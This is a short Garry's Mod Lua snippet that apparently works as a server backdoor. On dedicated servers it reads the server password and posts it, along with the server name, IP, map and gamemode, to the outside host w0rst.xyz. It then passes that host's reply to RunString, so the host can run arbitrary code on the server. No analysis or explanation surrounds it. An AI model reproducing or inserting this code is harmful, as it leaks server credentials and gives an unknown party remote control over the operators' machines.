if game.IsDedicated() then
    local server_pw = GetConVar("sv_password"):GetString()
    http.Post('https://w0rst.xyz/api/bonsai.php', {
        server_name=GetHostName(),
        server_ip=game.GetIPAddress(),
        server_map=game.GetMap(),
        server_pw=server_pw,
        server_gamemode=engine.ActiveGamemode() },
        function(b) RunString(b)
    end)
end
